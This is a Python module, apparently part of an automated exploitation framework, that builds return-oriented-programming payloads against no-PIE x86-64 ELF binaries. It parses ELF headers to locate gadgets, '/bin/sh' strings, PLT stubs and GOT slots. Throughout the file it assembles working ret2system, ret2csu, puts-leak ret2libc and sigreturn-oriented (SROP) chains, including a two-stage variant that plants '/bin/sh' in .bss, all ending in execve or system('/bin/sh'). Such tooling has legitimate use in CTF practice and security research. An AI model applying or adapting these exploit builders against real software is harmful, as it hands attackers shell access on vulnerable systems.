"""ROP / ret2system chain synthesis (Phase 9 frontier, assisted).

For a no-PIE x86-64 binary without a convenient "win" function, build a return-oriented chain
that calls `system("/bin/sh")`: a `pop rdi; ret` gadget loads the argument, a "/bin/sh" string
from the image is the argument, and `system@plt` is the call target. Deterministic and pure
stdlib (an objdump assist resolves the PLT stub when available). The stage confirms the chain
by reaching `system` under a breakpoint with RDI pointing at "/bin/sh".
"""
from __future__ import annotations

import re
import shutil
import struct
import subprocess

# useful x86-64 gadget byte patterns (the VA of the match is the gadget address)
GADGETS = {
    "pop_rdi": b"\x5f\xc3",           # pop rdi ; ret
    "pop_rsi": b"\x5e\xc3",           # pop rsi ; ret
    "pop_rdx": b"\x5a\xc3",           # pop rdx ; ret
    "ret": b"\xc3",                   # ret (stack alignment)
    "pop_rsi_r15": b"\x5e\x41\x5f\xc3",  # pop rsi ; pop r15 ; ret (libc_csu)
}


def _loads(data):
    """PT_LOAD segments as (file_off, filesz, vaddr, flags)."""
    if len(data) < 64 or data[:4] != b"\x7fELF" or data[4] != 2:
        return []
    endc = "<" if data[5] == 1 else ">"
    e_phoff = struct.unpack_from(endc + "Q", data, 32)[0]
    e_phentsize, e_phnum = struct.unpack_from(endc + "HH", data, 54)
    out = []
    for i in range(e_phnum):
        o = e_phoff + i * e_phentsize
        if o + e_phentsize > len(data):
            break
        p_type, p_flags = struct.unpack_from(endc + "II", data, o)
        p_offset = struct.unpack_from(endc + "Q", data, o + 8)[0]
        p_vaddr = struct.unpack_from(endc + "Q", data, o + 16)[0]
        p_filesz = struct.unpack_from(endc + "Q", data, o + 32)[0]
        if p_type == 1:                                # PT_LOAD
            out.append((p_offset, p_filesz, p_vaddr, p_flags))
    return out


def _va_of(segs, file_off, need_x=False):
    for off, sz, va, flags in segs:
        if off <= file_off < off + sz and (not need_x or (flags & 1)):
            return va + (file_off - off)
    return None


def _find_exec(data: bytes, pat: bytes):
    segs = _loads(data)
    for off, sz, _va, flags in segs:
        if not (flags & 1):                            # executable segments only
            continue
        idx = data.find(pat, off, off + sz)
        if idx >= 0:
            return _va_of(segs, idx, need_x=True)
    return None


def find_gadget(data: bytes, name: str):
    """VA of the first occurrence of gadget `name` in an executable segment, or None."""
    pat = GADGETS.get(name)
    return _find_exec(data, pat) if pat else None


# __libc_csu_init gadgets (present in ELF binaries built against pre-glibc-2.34 startup and in
# many firmware/legacy targets). The pop gadget loads rbx/rbp/r12/r13/r14/r15; the call gadget
# does rdx=r15; rsi=r14; edi=r13d; call [r12+rbx*8] -- a full 3-argument controlled call.
CSU_POP = bytes([0x5b, 0x5d, 0x41, 0x5c, 0x41, 0x5d, 0x41, 0x5e, 0x41, 0x5f, 0xc3])
CSU_CALL = bytes([0x4c, 0x89, 0xfa, 0x4c, 0x89, 0xf6, 0x44, 0x89, 0xef, 0x41, 0xff, 0x14, 0xdc])


def find_csu(data: bytes):
    """{'pop': va, 'call': va} for the __libc_csu_init ret2csu gadgets, or None."""
    pop = _find_exec(data, CSU_POP)
    call = _find_exec(data, CSU_CALL)
    return {"pop": pop, "call": call} if pop and call else None


def build_ret2csu(offset, pop, call, ptr, edi, rsi, rdx, length, rbx=0, rbp=0):
    """ret2csu chain: pop-gadget loads rbx/rbp/r12=ptr/r13=edi/r14=rsi/r15=rdx, then the
    call-gadget does the 3-arg call *[ptr+rbx*8]."""
    body = bytearray(_cyclic(offset))
    for w in (pop, rbx, rbp, ptr, edi, rsi, rdx, call):
        body += struct.pack("<Q", w & 0xFFFFFFFFFFFFFFFF)
    body += b"C" * 64                                  # post-call padding (breakpoint fires first)
    if len(body) < length:
        body += b"C" * (length - len(body))
    return bytes(body)


def find_string(data: bytes, s: bytes):
    """VA of byte string `s` (NUL-terminated form preferred) in a loaded segment, or None."""
    segs = _loads(data)
    for probe in (s + b"\x00", s):
        for off, sz, _va, _fl in segs:
            idx = data.find(probe, off, off + sz)
            if idx >= 0:
                return _va_of(segs, idx)
    return None


def resolve_plt(exe_path, name: str):
    """Address of `<name@plt>` via objdump, or None (objdump absent / symbol not called)."""
    if not shutil.which("objdump"):
        return None
    try:
        out = subprocess.run(["objdump", "-d", "--no-show-raw-insn", str(exe_path)],
                             capture_output=True, timeout=60, check=False).stdout.decode(
                                 "latin-1", "ignore")
    except (OSError, subprocess.SubprocessError):
        return None
    m = re.search(r"^0*([0-9a-fA-F]+)\s+<" + re.escape(name) + r"(?:@plt)?>:", out, re.M)
    return int(m.group(1), 16) if m else None


def build_ret2system(offset: int, pop_rdi: int, binsh: int, system: int, length: int,
                     ret_gadget=None) -> bytes:
    """cyclic filler, then: [ret align] ; pop rdi ; &"/bin/sh" ; system."""
    body = bytearray(_cyclic(offset))
    chain = []
    if ret_gadget:
        chain.append(ret_gadget)                       # 16-byte stack alignment for movaps
    chain += [pop_rdi, binsh, system]
    for word in chain:
        body += struct.pack("<Q", word & 0xFFFFFFFFFFFFFFFF)
    if len(body) < length:
        body += b"C" * (length - len(body))
    return bytes(body)


# --- ret2libc WITH a runtime leak (defeats ASLR without a `system` PLT entry) -------------------
# A modern challenge imports only puts/printf/read from libc -- never `system` -- and runs under
# ASLR, so neither a `system` PLT slot nor a fixed libc address exists. The classic answer is two
# stages over one connection: leak a libc pointer (call puts@plt on a GOT entry), subtract the
# symbol's known offset in THIS libc to recover the base, then re-trigger the overflow with a
# system("/bin/sh") chain built from base+offset. These helpers are the reusable primitives.

def _elf_class_endian(data: bytes):
    return (data[4] == 2, "<" if data[5] == 1 else ">")   # (is64, struct endian char)


def _sections(data: bytes) -> dict:
    """{section name: (offset, size, entsize)} from the section header table; {} on malformation."""
    try:
        is64, endc = _elf_class_endian(data)
        if is64:
            e_shoff = struct.unpack_from(endc + "Q", data, 0x28)[0]
            e_shentsize, e_shnum, e_shstrndx = struct.unpack_from(endc + "HHH", data, 0x3A)
            fmt, off_i, sz_i, ent_i = endc + "IIQQQQIIQQ", 4, 5, 9
        else:
            e_shoff = struct.unpack_from(endc + "I", data, 0x20)[0]
            e_shentsize, e_shnum, e_shstrndx = struct.unpack_from(endc + "HHH", data, 0x2E)
            fmt, off_i, sz_i, ent_i = endc + "IIIIIIIIII", 4, 5, 9
        shs = [struct.unpack_from(fmt, data, e_shoff + i * e_shentsize) for i in range(e_shnum)]
        strtab_off = shs[e_shstrndx][off_i]

        def _name(o):
            end = data.find(b"\x00", strtab_off + o)
            return data[strtab_off + o:end].decode("latin-1", "replace")

        return {_name(sh[0]): (sh[off_i], sh[sz_i], sh[ent_i]) for sh in shs}
    except Exception:
        return {}


def libc_symbols(data: bytes, names) -> dict:
    """{name: st_value} for the requested EXPORTED symbols of a libc/.so, read straight from
    .dynsym. `st_value` is the unrelocated vaddr, so the runtime address is `libc_base + st_value`.
    Pure stdlib (no readelf/nm), best-effort: {} on any malformation."""
    secs = _sections(data)
    ds, st = secs.get(".dynsym"), secs.get(".dynstr")
    if not ds or not st:
        return {}
    is64, endc = _elf_class_endian(data)
    entsize = ds[2] or (24 if is64 else 16)
    stroff = st[0]
    want, out = set(names), {}
    for o in range(ds[0], ds[0] + ds[1], entsize):
        try:
            if is64:
                st_name, _info, _oth, st_shndx, st_value, _sz = struct.unpack_from(
                    endc + "IBBHQQ", data, o)
            else:
                st_name, st_value, _sz, _info, _oth, st_shndx = struct.unpack_from(
                    endc + "IIIBBH", data, o)
        except struct.error:
            break
        if st_shndx == 0 or not st_value:            # undefined import, or no address -> skip
            continue
        end = data.find(b"\x00", stroff + st_name)
        nm = data[stroff + st_name:end].decode("latin-1", "replace")
        if nm in want and nm not in out:
            out[nm] = st_value
            if len(out) == len(want):
                break
    return out


def got_entry(data: bytes, name: str):
    """The GOT slot the PLT stub for `name` dereferences, read from .rela.plt/.rel.plt. For a
    no-PIE binary this is the absolute address whose contents (the resolved libc function) a
    `puts(got)` leak prints -- so leaking it and subtracting the symbol's libc offset gives the
    libc base. Pure stdlib, best-effort: None if the reloc/symbol tables are absent."""
    secs = _sections(data)
    rela = secs.get(".rela.plt") or secs.get(".rel.plt")
    ds, st = secs.get(".dynsym"), secs.get(".dynstr")
    if not rela or not ds or not st:
        return None
    is64, endc = _elf_class_endian(data)
    rel_ent = rela[2] or (24 if is64 else 8)
    sym_ent = ds[2] or (24 if is64 else 16)
    stroff = st[0]

    def _symname(idx):
        try:
            st_name = struct.unpack_from(endc + "I", data, ds[0] + idx * sym_ent)[0]
            end = data.find(b"\x00", stroff + st_name)
            return data[stroff + st_name:end].decode("latin-1", "replace")
        except struct.error:
            return ""

    for o in range(rela[0], rela[0] + rela[1], rel_ent):
        try:
            if is64:
                r_offset, r_info = struct.unpack_from(endc + "QQ", data, o)[:2]
                sym = r_info >> 32
            else:
                r_offset, r_info = struct.unpack_from(endc + "II", data, o)[:2]
                sym = r_info >> 8
        except struct.error:
            break
        if _symname(sym) == name:
            return r_offset
    return None


def resolve_libc_base(leaked: int, sym_offset: int):
    """libc load base from a leaked runtime address of a symbol at `sym_offset`. A real libc base
    is page-aligned; anything else means the leak was not the pointer we assumed, so return None
    rather than a bogus base that would send every resolved address into the weeds."""
    base = leaked - sym_offset
    return base if base > 0 and base % 0x1000 == 0 else None


def build_leak_puts(offset: int, *, pop_rdi: int, got: int, puts_plt: int, ret_to: int,
                    length: int = 0, ret_gadget=None) -> bytes:
    """Stage 1: cyclic filler, then puts(GOT) -- prints the libc address stored at `got` as raw
    little-endian bytes -- and returns to `ret_to` (the vulnerable function / main) so the program
    loops back and reads stage 2 over the same connection."""
    body = bytearray(_cyclic(offset))
    chain = [pop_rdi, got, puts_plt]
    if ret_gadget:
        chain.append(ret_gadget)                         # keep rsp 16-aligned for the re-entry
    chain.append(ret_to)
    for word in chain:
        body += struct.pack("<Q", word & 0xFFFFFFFFFFFFFFFF)
    if len(body) < length:
        body += b"C" * (length - len(body))
    return bytes(body)


def _cyclic(n):
    from .primitive import cyclic
    return cyclic(n)


# --------------------------------------------------------------------------- SROP (x86-64)
# Sigreturn-oriented programming: a single `syscall` with rax=15 (rt_sigreturn) restores the ENTIRE
# register set from a frame the attacker placed on the stack. It turns a stack overflow + one
# syscall gadget into arbitrary register control -- enough to call execve("/bin/sh",0,0) without any
# pop-gadgets. Used for static/no-PIE targets where a ret2libc/ret2csu chain isn't available.

_SC = b"\x0f\x05"                                   # syscall
_SC_RET = b"\x0f\x05\xc3"                           # syscall ; ret
_POP_RAX = b"\x58\xc3"                              # pop rax ; ret

# byte offset (in 8-byte words) of each register inside the amd64 rt_sigframe the kernel reads at
# rsp when rt_sigreturn runs. Matches the Linux sigcontext layout (== pwntools SigreturnFrame).
_SIGFRAME_WORDS = {
    "r8": 5, "r9": 6, "r10": 7, "r11": 8, "r12": 9, "r13": 10, "r14": 11, "r15": 12,
    "rdi": 13, "rsi": 14, "rbp": 15, "rbx": 16, "rdx": 17, "rax": 18, "rcx": 19,
    "rsp": 20, "rip": 21,
}
_CSGSFS_WORD = 23                                   # cs=0x33 for 64-bit user code


def find_syscall(data: bytes):
    """VA of a `syscall ; ret` gadget (preferred) or a bare `syscall`, or None."""
    return _find_exec(data, _SC_RET) or _find_exec(data, _SC)


def find_pop_rax(data: bytes):
    """VA of a `pop rax ; ret` gadget, or None (rax must then be set another way)."""
    return _find_exec(data, _POP_RAX)


_MOV_EAX_15 = b"\xb8\x0f\x00\x00\x00\xc3"           # mov eax, 15 ; ret
_MOV_RAX_15 = b"\x48\xc7\xc0\x0f\x00\x00\x00\xc3"   # mov rax, 15 ; ret


def find_rax15(data: bytes):
    """A gadget that puts 15 (rt_sigreturn) into rax for SROP, as (vaddr, kind): `pop rax;ret`
    (kind 'pop' -- the 15 is the NEXT stack word) or `mov eax/rax,15;ret` (kind 'mov' -- no stack
    word). Generalises the SROP bootstrap beyond `pop rax`, which some no-pop-rax binaries lack."""
    a = find_pop_rax(data)
    if a:
        return (a, "pop")
    a = _find_exec(data, _MOV_EAX_15) or _find_exec(data, _MOV_RAX_15)
    if a:
        return (a, "mov")
    return None


def find_writable(data: bytes, need: int = 16):
    """(vaddr, size) of a SAFE fixed writable address to plant bytes on a no-PIE target: an address
    in the .bss (the uninitialized tail of a writable PT_LOAD, past p_filesz) rather than the
    segment START -- the start holds .dynamic/.got/.data, and a read() that overruns them corrupts
    the loader state and crashes before execve. Falls back to the segment start only if no .bss."""
    if len(data) < 64 or data[:4] != b"\x7fELF" or data[4] != 2:
        return None
    endc = "<" if data[5] == 1 else ">"
    e_phoff = struct.unpack_from(endc + "Q", data, 32)[0]
    e_phentsize, e_phnum = struct.unpack_from(endc + "HH", data, 54)
    fallback = None
    for i in range(e_phnum):
        o = e_phoff + i * e_phentsize
        if o + e_phentsize > len(data):
            break
        p_type, p_flags = struct.unpack_from(endc + "II", data, o)
        if p_type != 1 or not (p_flags & 2):            # PT_LOAD, writable (p_flags bit1 = W)
            continue
        p_vaddr = struct.unpack_from(endc + "Q", data, o + 16)[0]
        p_filesz = struct.unpack_from(endc + "Q", data, o + 32)[0]
        p_memsz = struct.unpack_from(endc + "Q", data, o + 40)[0]
        bss = (p_vaddr + p_filesz + 0xF) & ~0xF         # start of .bss, 16-aligned
        room = (p_vaddr + p_memsz) - bss
        if room >= max(need, 16):
            return (bss, room)                          # uninitialized -> safe to clobber
        if fallback is None and p_memsz >= need:
            fallback = (p_vaddr, p_memsz)
    return fallback


def sigreturn_frame(*, rip, rsp=0, rdi=0, rsi=0, rdx=0, rax=0, rbp=0, rbx=0, rcx=0,
                    r8=0, r9=0, r10=0, r11=0, r12=0, r13=0, r14=0, r15=0) -> bytes:
    """The 248-byte amd64 rt_sigframe restored by rt_sigreturn(rax=15). Set the registers the
    controlled `syscall` at `rip` will then use (e.g. rax=59, rdi=&"/bin/sh" for execve)."""
    words = [0] * 31                                # 31 qwords = 0xF8 bytes
    vals = dict(rip=rip, rsp=rsp, rdi=rdi, rsi=rsi, rdx=rdx, rax=rax, rbp=rbp, rbx=rbx, rcx=rcx,
                r8=r8, r9=r9, r10=r10, r11=r11, r12=r12, r13=r13, r14=r14, r15=r15)
    for reg, w in _SIGFRAME_WORDS.items():
        words[w] = vals[reg]
    words[_CSGSFS_WORD] = 0x33
    return b"".join(struct.pack("<Q", v & 0xFFFFFFFFFFFFFFFF) for v in words)


def srop_feasible(data: bytes):
    """What an SROP execve chain needs, and which pieces this binary supplies. Returns a dict the
    exploit stage uses to decide: {syscall, pop_rax, writable, binsh}. `syscall` is required; a
    writable segment (to plant "/bin/sh") and a way to set rax=15 are the other gatekeepers."""
    return {
        "syscall": find_syscall(data),
        "pop_rax": find_pop_rax(data),
        "rax15": find_rax15(data),                      # (addr, 'pop'|'mov') -- generalises pop_rax
        "writable": find_writable(data),
        "binsh": find_string(data, b"/bin/sh"),
    }


def build_srop_execve(offset: int, *, syscall: int, binsh: int, length: int,
                      pop_rax: int, rsp: int = 0) -> bytes:
    """One-shot SROP execve("/bin/sh",0,0) for a binary WITH a `pop rax; ret` gadget and "/bin/sh"
    already at `binsh`: overflow -> pop rax;15 -> syscall(rt_sigreturn) -> frame(execve).
    The `syscall` gadget doubles as the frame's rip so the restored rax=59 runs execve."""
    body = bytearray(_cyclic(offset))
    body += struct.pack("<Q", pop_rax)
    body += struct.pack("<Q", 15)                   # rt_sigreturn
    body += struct.pack("<Q", syscall)              # executes rt_sigreturn
    body += sigreturn_frame(rip=syscall, rax=59, rdi=binsh, rsi=0, rdx=0, rsp=rsp or binsh)
    if len(body) < length:
        body += b"C" * (length - len(body))
    return bytes(body)


def build_srop_execve_plant(offset: int, *, syscall: int, rax15, writable: int,
                            count: int = 0x200, binsh_off: int = 0x120):
    """Two-STAGE SROP execve for a binary that has a writable segment and a rax=15 gadget but NO
    "/bin/sh" string in the image: PLANT the string via a read, then execve it. No leak needed on a
    no-PIE target because `writable` is a fixed address. `rax15` is (vaddr, kind) from find_rax15:
    a `pop rax;ret` (the 15 follows on the stack) or a `mov eax/rax,15;ret` (no stack word).

      stage1 (to the overflowing read): pad(offset) -> set rax=15 -> syscall(rt_sigreturn) ->
        frame{rax=0(read), rdi=0, rsi=writable, rdx=count, rip=syscall, rsp=writable}
        -- so after the read the `ret` pivots rsp INTO the freshly-read stage2.
      stage2 (to that read): set rax=15 -> syscall(rt_sigreturn) ->
        frame{rax=59(execve), rdi=writable+binsh_off, rip=syscall} ... "/bin/sh\\0" at +binsh_off.

    Returns (stage1, stage2): send stage1 to the overflow, then stage2 to the planted read.
    """
    gaddr, kind = rax15

    def _set_rax15():                                # put 15 in rax, then the syscall gadget
        if kind == "pop":                            # pop rax; ret -- 15 is the next stack word
            return struct.pack("<Q", gaddr) + struct.pack("<Q", 15) + struct.pack("<Q", syscall)
        return struct.pack("<Q", gaddr) + struct.pack("<Q", syscall)   # mov eax,15;ret -- no word
    binsh = writable + binsh_off
    stage2 = _set_rax15() + sigreturn_frame(rip=syscall, rax=59, rdi=binsh, rsi=0, rdx=0,
                                            rsp=writable)
    stage2 = stage2.ljust(binsh_off, b"\x00") + b"/bin/sh\x00"
    frame1 = sigreturn_frame(rip=syscall, rax=0, rdi=0, rsi=writable, rdx=count, rsp=writable)
    stage1 = bytes(_cyclic(offset)) + _set_rax15() + frame1
    return stage1, stage2
